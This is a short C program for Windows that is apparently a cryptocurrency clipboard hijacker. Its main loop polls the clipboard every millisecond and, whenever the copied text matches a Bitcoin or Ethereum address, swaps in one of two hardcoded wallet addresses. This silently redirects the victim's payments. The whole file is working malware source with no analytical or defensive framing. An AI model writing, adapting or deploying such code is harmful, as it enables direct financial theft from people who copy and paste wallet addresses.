#include <windows.h>
#include "matching.h"

char* getclipboard()
{
    static HANDLE clip;
    if (OpenClipboard(NULL))
    {
        clip = GetClipboardData(CF_TEXT);
        CloseClipboard();
    }
    return (char*)clip;
}

void setclipboard(char* text)
{
    HGLOBAL global = GlobalAlloc(GMEM_FIXED, strlen(text) + 1);
    memcpy(global, text, strlen(text));
    if (OpenClipboard(NULL))
    {
        EmptyClipboard();
        SetClipboardData(CF_TEXT, global);
        CloseClipboard();
    }
}

int main() {
    char* btcadr = "1moneyEYdrf8k5Fyrmr5vQNb9NZhRj89L";
    char* ethadr = "0x35eC1B57e4548b6b4E886158FaA4936b385C0333";
    while (1) {
        char* clipdata = getclipboard();
        if (isbtc(clipdata)) setclipboard(btcadr);
        else if (iseth(clipdata)) setclipboard(ethadr);
        Sleep(1);
    }
}